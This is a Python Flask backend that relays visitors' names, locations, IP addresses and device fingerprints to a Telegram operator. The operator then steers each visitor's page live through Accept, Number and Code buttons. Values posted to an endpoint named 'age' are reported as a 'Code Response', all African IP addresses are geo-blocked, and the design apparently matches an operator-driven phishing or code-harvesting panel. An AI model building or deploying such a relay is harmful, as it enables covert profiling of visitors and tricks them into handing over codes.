import ipaddress
import os
import queue
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta, timezone
from typing import Any

from dotenv import load_dotenv
from flask import Flask, Response, jsonify, request, send_from_directory
import requests

ROOT = os.path.dirname(os.path.abspath(__file__))
load_dotenv(os.path.join(ROOT, ".env"))

BOT_TOKEN: str = os.environ.get("BOT_TOKEN") or os.environ.get("TELEGRAM_BOT_TOKEN", "")
ADMIN_CHAT_ID: str = os.environ.get("ADMIN_CHAT_ID") or os.environ.get("TELEGRAM_ADMIN_CHAT_ID", "")

app = Flask(__name__, static_folder=ROOT, static_url_path="")
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(days=7)

# ──────────────────────────────────────────────────────────────────────────────
# Thread-pools
# ──────────────────────────────────────────────────────────────────────────────
tg_pool = ThreadPoolExecutor(max_workers=8, thread_name_prefix="tg")
bg_pool = ThreadPoolExecutor(max_workers=4, thread_name_prefix="bg")

# ──────────────────────────────────────────────────────────────────────────────
# HTTP sessions – poll_http is EXCLUSIVELY for the long-poll loop thread so
# no other outbound call can ever stall it via connection-pool contention.
# ──────────────────────────────────────────────────────────────────────────────
_proxy = (
    os.environ.get("http_proxy")
    or os.environ.get("https_proxy")
    or os.environ.get("HTTP_PROXY")
)
if not _proxy and os.path.exists("/etc/pythonanywhere"):
    _proxy = "http://proxy.server:3128"


def _make_http() -> requests.Session:
    s = requests.Session()
    if _proxy:
        s.proxies = {"http": _proxy, "https": _proxy}
    return s


http      = _make_http()   # tg_pool workers, bg_pool, geo-IP
poll_http = _make_http()   # telegram_loop ONLY

# ──────────────────────────────────────────────────────────────────────────────
# Session store
# ──────────────────────────────────────────────────────────────────────────────
state_lock = threading.Lock()
sessions: dict[str, dict[str, Any]] = {}

# ──────────────────────────────────────────────────────────────────────────────
# SSE broadcaster
#
# Each connected browser tab registers a Queue here.  When state changes
# (operator presses Accept / Number / Code / Decline) we push a JSON event
# into every queue whose session-id matches.  The SSE generator drains its
# queue and streams the event to the browser immediately — zero polling delay.
# ──────────────────────────────────────────────────────────────────────────────
_sse_lock = threading.Lock()
# { sid -> [queue, queue, ...] }  (multiple tabs per session are fine)
_sse_listeners: dict[str, list[queue.Queue]] = {}


def _sse_subscribe(sid: str) -> "queue.Queue[str | None]":
    q: queue.Queue[str | None] = queue.Queue(maxsize=32)
    with _sse_lock:
        _sse_listeners.setdefault(sid, []).append(q)
    return q


def _sse_unsubscribe(sid: str, q: "queue.Queue") -> None:
    with _sse_lock:
        listeners = _sse_listeners.get(sid, [])
        try:
            listeners.remove(q)
        except ValueError:
            pass
        if not listeners:
            _sse_listeners.pop(sid, None)


def _sse_push(sid: str, data: dict[str, Any]) -> None:
    """Push a state snapshot to every browser tab listening on `sid`."""
    import json as _json
    payload = f"data: {_json.dumps(data)}\n\n"
    with _sse_lock:
        listeners = list(_sse_listeners.get(sid, []))
    for q in listeners:
        try:
            q.put_nowait(payload)
        except queue.Full:
            pass  # slow consumer – drop; they'll fall back to the REST poll


# ──────────────────────────────────────────────────────────────────────────────
# Update-dedup guard
# ──────────────────────────────────────────────────────────────────────────────
_seen_lock = threading.Lock()
_seen_ids: set[int] = set()
_SEEN_MAX = 500


# ──────────────────────────────────────────────────────────────────────────────
# Geo-IP
# ──────────────────────────────────────────────────────────────────────────────
ip_cache_lock = threading.Lock()
ip_geo_cache: dict[str, bool] = {}

AFRICAN_CC = {
    "AO","BF","BI","BJ","BW","CD","CF","CG","CI","CM","CV","DJ","DZ",
    "EG","ER","ET","GA","GH","GM","GN","GQ","GW","KE","KM","LR","LS",
    "LY","MA","MG","ML","MR","MU","MW","MZ","NA","NE","NG","RW","SC",
    "SD","SL","SN","SO","SS","ST","SZ","TD","TG","TN","TZ","UG","ZA",
    "ZM","ZW","EH",
}


def _is_private(ip: str) -> bool:
    try:
        o = ipaddress.ip_address(ip)
        return o.is_private or o.is_loopback or o.is_link_local
    except ValueError:
        return False


def is_african_ip(ip: str) -> bool:
    if not ip or ip in ("Unknown", "127.0.0.1", "::1"):
        return False
    if _is_private(ip):
        return False
    with ip_cache_lock:
        if ip in ip_geo_cache:
            return ip_geo_cache[ip]
    result = False
    for url in (
        f"http://ip-api.com/json/{ip}?fields=status,countryCode,continentCode",
        f"https://ipapi.co/{ip}/json/",
    ):
        try:
            r = http.get(url, timeout=3)
            if r.status_code == 200:
                d = r.json()
                cont = str(d.get("continentCode") or d.get("continent_code") or "").upper()
                cc   = str(d.get("countryCode")   or d.get("country_code")   or "").upper()
                if d.get("status", "success") == "success" or "continent_code" in d:
                    result = cont == "AF" or cc in AFRICAN_CC
                    with ip_cache_lock:
                        ip_geo_cache[ip] = result
                    return result
        except Exception as e:
            print(f"[geo] {ip}: {e}")
    return False


def is_ngrok() -> bool:
    host    = (request.headers.get("X-Forwarded-Host") or request.host or "").lower()
    referer = (request.headers.get("Referer") or "").lower()
    ua      = (request.headers.get("User-Agent") or "").lower()
    return "ngrok" in host or "ngrok" in referer or "ngrok" in ua


def ts() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")


# ──────────────────────────────────────────────────────────────────────────────
# Telegram helpers
# ──────────────────────────────────────────────────────────────────────────────
def kb(rows: list[list[dict[str, str]]]) -> dict:
    return {"inline_keyboard": rows}


def control_kb(sid: str) -> dict:
    return kb([[
        {"text": "🔢 Number", "callback_data": f"mode:number:{sid}"},
        {"text": "🔑 Code",   "callback_data": f"mode:code:{sid}"},
    ]])


def number_kb(sid: str) -> dict:
    btns = [{"text": str(n), "callback_data": f"number:{n}:{sid}"} for n in range(1, 101)]
    return kb([btns[i:i+8] for i in range(0, 100, 8)])


def tg_call(method: str, payload: dict, timeout: int = 35,
            silent_409: bool = False, use_poll_http: bool = False) -> dict:
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    sess = poll_http if use_poll_http else http
    try:
        r = sess.post(url, json=payload, timeout=timeout)
        r.raise_for_status()
        data = r.json()
        if not data.get("ok"):
            raise RuntimeError(data.get("description", "Telegram error"))
        return data
    except Exception as e:
        if not (silent_409 and "409" in str(e)):
            print(f"[tg] {method}: {e}")
        raise


def tg_async(method: str, payload: dict, **kw) -> None:
    tg_pool.submit(tg_call, method, payload, **kw)


# ──────────────────────────────────────────────────────────────────────────────
# Session helpers
# ──────────────────────────────────────────────────────────────────────────────
def get_sid() -> str:
    sid = (request.headers.get("X-Session-ID")
           or request.args.get("sid")
           or "default_session")
    return str(sid).strip()[:64]


def _blank(sid: str) -> dict:
    return {
        "id": sid, "status": "idle", "mode": None, "number": None,
        "player_name": "", "game_location": "",
        "visited": False, "client_ip": "", "user_agent": "",
        "updated_at": time.time(),
    }


def get_or_create(sid: str) -> dict:
    with state_lock:
        if sid not in sessions:
            sessions[sid] = _blank(sid)
        else:
            sessions[sid]["updated_at"] = time.time()
        return dict(sessions[sid])


def set_state(sid: str, **kw) -> dict:
    with state_lock:
        if sid not in sessions:
            sessions[sid] = _blank(sid)
        sessions[sid].update(kw)
        sessions[sid]["updated_at"] = time.time()
        snap = dict(sessions[sid])
    # Push to all SSE listeners for this session immediately
    _sse_push(sid, snap)
    return snap


def cleanup() -> None:
    cutoff = time.time() - 7 * 86400
    with state_lock:
        dead = [k for k, v in sessions.items() if v.get("updated_at", 0) < cutoff]
        for k in dead:
            del sessions[k]


# ──────────────────────────────────────────────────────────────────────────────
# Flask middleware
# ──────────────────────────────────────────────────────────────────────────────
@app.before_request
def gate() -> Any:
    if request.method == "OPTIONS":
        return None
    if request.endpoint in ("telegram_webhook", "access_diag") or is_ngrok():
        return None
    ip = (request.headers.get("X-Forwarded-For", request.remote_addr or "")
          .split(",")[0].strip())
    if is_african_ip(ip):
        return jsonify({"error": "Access denied. Not available in your region.", "blocked": True}), 403


@app.after_request
def cors(resp: Any) -> Any:
    resp.headers["Access-Control-Allow-Origin"]  = "*"
    resp.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization, X-Session-ID"
    resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return resp


@app.route("/api/<path:path>", methods=["OPTIONS"])
def options_handler(path: str) -> Any:
    return "", 200


# ──────────────────────────────────────────────────────────────────────────────
# Telegram update handler
# ──────────────────────────────────────────────────────────────────────────────
def _resolve_sid(parts: list[str], cmd: str) -> str | None:
    sid = None
    if cmd in ("accept", "decline") and len(parts) > 1:
        sid = parts[1]
    elif cmd in ("mode", "number") and len(parts) > 2:
        sid = parts[2]
    with state_lock:
        if sid and sid in sessions:
            return sid
        if sessions:
            return max(sessions, key=lambda k: sessions[k].get("updated_at", 0))
    return None


def handle_update(update: dict) -> None:
    uid = update.get("update_id", -1)
    if uid >= 0:
        with _seen_lock:
            if uid in _seen_ids:
                return
            _seen_ids.add(uid)
            if len(_seen_ids) > _SEEN_MAX:
                for old in sorted(_seen_ids)[:_SEEN_MAX // 2]:
                    _seen_ids.discard(old)

    cb = update.get("callback_query")
    if not cb:
        return

    msg     = cb.get("message", {})
    chat_id = str(msg.get("chat", {}).get("id", "")).strip()
    if chat_id != str(ADMIN_CHAT_ID).strip():
        return

    action      = cb.get("data", "")
    cb_id       = cb.get("id")
    message_id  = msg.get("message_id")
    parts       = action.split(":")
    cmd         = parts[0]

    # Answer the Telegram callback async (just clears the spinner on operator's
    # phone). State update happens synchronously below – zero extra latency.
    if cb_id:
        tg_async("answerCallbackQuery",
                 {"callback_query_id": cb_id, "text": "✅"},
                 timeout=8, silent_409=True)

    sid = _resolve_sid(parts, cmd) or "default_session"

    if cmd == "accept":
        set_state(sid, status="accepted", mode=None, number=None)
        if message_id:
            tg_async("editMessageReplyMarkup",
                     {"chat_id": chat_id, "message_id": message_id,
                      "reply_markup": control_kb(sid)}, silent_409=True)

    elif cmd == "decline":
        set_state(sid, status="declined", mode=None, number=None)
        if message_id:
            tg_async("editMessageText",
                     {"chat_id": chat_id, "message_id": message_id,
                      "text": "❌ Session declined."}, silent_409=True)

    elif cmd == "mode" and len(parts) > 1:
        mode = parts[1]
        if mode == "number":
            set_state(sid, status="accepted", mode="number", number=None)
            if message_id:
                tg_async("editMessageReplyMarkup",
                         {"chat_id": chat_id, "message_id": message_id,
                          "reply_markup": number_kb(sid)}, silent_409=True)
        elif mode == "code":
            set_state(sid, status="accepted", mode="code", number=None)
            if message_id:
                tg_async("editMessageText",
                         {"chat_id": chat_id, "message_id": message_id,
                          "text": "✅ Code mode active – waiting for player."}, silent_409=True)

    elif cmd == "number" and len(parts) > 2:
        try:
            n = int(parts[1])
        except ValueError:
            return
        set_state(sid, status="accepted", mode="number", number=n)
        if message_id:
            tg_async("editMessageText",
                     {"chat_id": chat_id, "message_id": message_id,
                      "text": f"✅ Number: {n}"}, silent_409=True)


# ──────────────────────────────────────────────────────────────────────────────
# Telegram long-poll loop
# poll_http is dedicated so nothing can stall it via connection-pool sharing.
# timeout=20 means Telegram holds the HTTP connection open and returns the
# moment a button is pressed – delivery is essentially instantaneous.
# ──────────────────────────────────────────────────────────────────────────────
def telegram_loop() -> None:
    for attempt in range(3):
        try:
            tg_call("deleteWebhook", {"drop_pending_updates": False},
                    timeout=15, use_poll_http=True)
            print("[tg] webhook cleared – long-poll active")
            break
        except Exception as e:
            print(f"[tg] deleteWebhook attempt {attempt+1}: {e}")
            time.sleep(2)

    offset = 0
    errs   = 0
    while True:
        try:
            cleanup()
            res = tg_call(
                "getUpdates",
                {"offset": offset, "timeout": 20, "allowed_updates": ["callback_query"]},
                timeout=25, use_poll_http=True,
            )
            updates = res.get("result", [])
            for u in updates:
                offset = u["update_id"] + 1
                try:
                    handle_update(u)
                except Exception as e:
                    print(f"[tg] handle_update: {e}")
            errs = 0
            time.sleep(0 if updates else 0.05)
        except Exception as e:
            errs += 1
            if "409" in str(e):
                print("[tg] 409 conflict – backing off 10s")
                time.sleep(10)
            else:
                wait = min(2 ** errs, 30)
                print(f"[tg] getUpdates error #{errs}: {e} – retry in {wait}s")
                time.sleep(wait)


# ──────────────────────────────────────────────────────────────────────────────
# Routes
# ──────────────────────────────────────────────────────────────────────────────

@app.route("/telegram-webhook", methods=["POST", "GET"])
def telegram_webhook() -> Any:
    if request.method == "GET":
        return jsonify({"ok": True})
    u = request.get_json(silent=True) or {}
    if u:
        handle_update(u)
    return jsonify({"ok": True})


@app.get("/")
def index() -> Any:
    return send_from_directory(ROOT, "index.html")


@app.route("/access", methods=["GET"])
def access_diag() -> Any:
    preview = (f"{BOT_TOKEN[:6]}...{BOT_TOKEN[-4:]}" if len(BOT_TOKEN) > 10
               else ("NOT SET" if not BOT_TOKEN else BOT_TOKEN))
    return jsonify({
        "status": "online",
        "telegram_configured": bool(BOT_TOKEN and ADMIN_CHAT_ID),
        "bot_token_preview": preview,
        "admin_chat_id": ADMIN_CHAT_ID or "NOT SET",
        "active_sessions": len(sessions),
        "sse_listeners": {k: len(v) for k, v in _sse_listeners.items()},
        "server_time_utc": ts(),
    })


# ── SSE stream ─────────────────────────────────────────────────────────────
# The browser opens GET /api/stream and keeps the connection alive.
# When state changes (operator press) set_state() calls _sse_push() which
# puts the new snapshot into this session's queue.  The generator drains it
# and streams "data: {...}\n\n" to the browser within milliseconds.
# A keepalive comment (": ping\n\n") is sent every 15 s so proxies and
# Render's load balancer don't close idle connections.
# ──────────────────────────────────────────────────────────────────────────────
@app.get("/api/stream")
def sse_stream() -> Response:
    sid = get_sid()
    q   = _sse_subscribe(sid)
    # Send current state immediately so the browser is in sync on connect
    current = get_or_create(sid)

    def generate():
        import json as _json
        try:
            # Immediate snapshot on connect
            yield f"data: {_json.dumps(current)}\n\n"
            while True:
                try:
                    # Block up to 15 s waiting for a pushed event
                    msg = q.get(timeout=15)
                    if msg is None:          # sentinel – close stream
                        return
                    yield msg
                except queue.Empty:
                    # No event in 15 s → send a keepalive comment
                    yield ": ping\n\n"
        finally:
            _sse_unsubscribe(sid, q)

    resp = Response(generate(), mimetype="text/event-stream")
    resp.headers["Cache-Control"]        = "no-cache"
    resp.headers["X-Accel-Buffering"]    = "no"   # disable Nginx buffering
    resp.headers["Access-Control-Allow-Origin"] = "*"
    return resp


@app.get("/api/session")
def get_session_route() -> Any:
    sid  = get_sid()
    data = get_or_create(sid)
    resp = jsonify(data)
    resp.headers["Cache-Control"] = "no-store"
    return resp


@app.post("/api/heartbeat")
def heartbeat() -> Any:
    sid  = get_sid()
    data = get_or_create(sid)
    return jsonify({"ok": True, "status": data["status"],
                    "mode": data["mode"], "number": data["number"]})


@app.route("/api/visit", methods=["POST", "OPTIONS"])
def record_visit() -> Any:
    if request.method == "OPTIONS":
        return "", 200
    sid  = get_sid()
    sess = get_or_create(sid)
    if sess.get("visited"):
        return jsonify({"ok": True, "already_logged": True})
    set_state(sid, visited=True)

    body = request.get_json(silent=True) or {}
    ip   = (request.headers.get("X-Forwarded-For", request.remote_addr or "")
            .split(",")[0].strip())
    ua   = request.headers.get("User-Agent", "Unknown")
    lang = request.headers.get("Accept-Language", "Unknown")
    ref  = request.headers.get("Referer") or body.get("referrer") or "Direct"
    ci   = body.get("clientInfo", {})

    if BOT_TOKEN and ADMIN_CHAT_ID:
        text = (
            f"👀 New Visit\n\n⏰ {ts()}\n🔗 {ref}\n\n"
            f"• IP: {ip}\n• UA: {ua}\n"
            f"• Lang: {ci.get('language', lang)}\n"
            f"• Screen: {ci.get('screen','?')}\n"
            f"• TZ: {ci.get('timezone','?')}\n"
            f"• Platform: {ci.get('platform','?')}"
        )
        bg_pool.submit(tg_call, "sendMessage", {"chat_id": ADMIN_CHAT_ID, "text": text})
    return jsonify({"ok": True})


@app.route("/api/submit", methods=["POST", "OPTIONS"])
def submit() -> Any:
    if request.method == "OPTIONS":
        return "", 200
    body  = request.get_json(silent=True) or {}
    name  = str(body.get("playerName", "")).strip()[:40]
    loc   = str(body.get("gameLocation", "")).strip()[:80]
    if not name or not loc:
        return jsonify({"error": "Player name and game location are required."}), 400
    if not BOT_TOKEN or not ADMIN_CHAT_ID:
        return jsonify({"error": "Telegram not configured."}), 503

    sid  = get_sid()
    ip   = (request.headers.get("X-Forwarded-For", request.remote_addr or "")
            .split(",")[0].strip())
    ua   = request.headers.get("User-Agent", "Unknown")
    lang = request.headers.get("Accept-Language", "Unknown")
    ci   = body.get("clientInfo", {})

    text = (
        f"🎮 New Submission\n\n⏰ {ts()}\n"
        f"👤 {name}\n📍 {loc}\n\n"
        f"• IP: {ip}\n• UA: {ua}\n"
        f"• Lang: {ci.get('language', lang)}\n"
        f"• Screen: {ci.get('screen','?')}\n"
        f"• TZ: {ci.get('timezone','?')}\n"
        f"• Platform: {ci.get('platform','?')}"
    )
    try:
        tg_call("sendMessage", {
            "chat_id": ADMIN_CHAT_ID,
            "text": text,
            "reply_markup": kb([[
                {"text": "✅ Accept",  "callback_data": f"accept:{sid}"},
                {"text": "❌ Decline", "callback_data": f"decline:{sid}"},
            ]]),
        })
    except Exception as e:
        return jsonify({"error": f"Telegram error: {e}"}), 502

    set_state(sid, status="submitted", mode=None, number=None,
              player_name=name, game_location=loc,
              client_ip=ip, user_agent=ua)
    return jsonify({"ok": True})


@app.route("/api/age", methods=["POST", "OPTIONS"])
def submit_age() -> Any:
    if request.method == "OPTIONS":
        return "", 200
    body = request.get_json(silent=True) or {}
    try:
        age = int(body.get("age"))
    except (TypeError, ValueError):
        return jsonify({"error": "Age must be a whole number."}), 400
    if age < 1:
        return jsonify({"error": "Age must be at least 1."}), 400

    sid  = get_sid()
    curr = get_or_create(sid)
    if curr["status"] != "accepted" or curr["mode"] != "code":
        return jsonify({"error": "Code input is not active for this session."}), 409
    if not BOT_TOKEN or not ADMIN_CHAT_ID:
        return jsonify({"error": "Telegram not configured."}), 503

    ip = curr.get("client_ip") or (
        request.headers.get("X-Forwarded-For", request.remote_addr or "")
        .split(",")[0].strip())
    ua = curr.get("user_agent") or request.headers.get("User-Agent", "Unknown")

    text = (
        f"🎯 Code Response\n\n⏰ {ts()}\n"
        f"👤 {curr.get('player_name','?')}\n"
        f"📍 {curr.get('game_location','?')}\n"
        f"🔢 Value: {age}\n\n"
        f"• IP: {ip}\n• UA: {ua}"
    )
    try:
        tg_call("sendMessage", {"chat_id": ADMIN_CHAT_ID, "text": text})
    except Exception as e:
        return jsonify({"error": f"Telegram error: {e}"}), 502
    return jsonify({"ok": True})


# ──────────────────────────────────────────────────────────────────────────────
# Boot
# ──────────────────────────────────────────────────────────────────────────────
if BOT_TOKEN and ADMIN_CHAT_ID:
    threading.Thread(target=telegram_loop, daemon=True, name="tg-poll").start()
    print(f"[tg] long-poll started  admin={ADMIN_CHAT_ID}")
else:
    print("[tg] disabled – set BOT_TOKEN + ADMIN_CHAT_ID")

if __name__ == "__main__":
    app.run(host="127.0.0.1",
            port=int(os.environ.get("PORT", "5000")),
            debug=False, threaded=True)
